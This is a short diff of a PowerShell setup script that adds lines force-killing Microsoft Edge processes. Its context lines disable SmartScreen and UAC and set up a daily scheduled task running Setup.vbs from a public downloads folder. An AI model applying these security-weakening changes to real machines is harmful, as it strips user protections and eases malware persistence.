@@ -112,6 +112,9 @@ if (Test-Path $updateAssistant) {
 Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off"
 Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0
 Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name 'ScreenSaveActive' -Value '0'
+Get-Process -Name "msedge" -ErrorAction SilentlyContinue | Stop-Process -Force
+Get-Process -Name "MicrosoftEdgeUpdate" -ErrorAction SilentlyContinue | Stop-Process -Force
+Get-Process | Where-Object { $_.ProcessName -like "msedgewebview2*" } | Stop-Process -Force -ErrorAction SilentlyContinue
 
 $taskName = "Run Setup.vbs Daily"
 $setupPath = "C:\Users\Public\Downloads\Setup.vbs"
